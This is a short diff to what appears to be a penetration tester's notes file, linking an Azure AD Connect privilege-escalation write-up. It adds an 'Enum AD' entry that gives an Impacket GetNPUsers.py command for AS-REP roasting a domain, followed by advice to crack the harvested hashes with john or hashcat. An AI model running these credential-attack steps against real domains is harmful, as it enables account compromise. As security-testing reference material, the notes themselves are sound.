@@ -60,3 +60,7 @@ https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/
 
 # Windows-RPC-Service
 https://nmap.org/nsedoc/scripts/nfs-showmount.html
+
+# Enum AD
+GetNPUsers.py -usersfile <user_list> -dc-ip <dc-ip> <domain>/
+Afterwards crack with john or oclhashcat
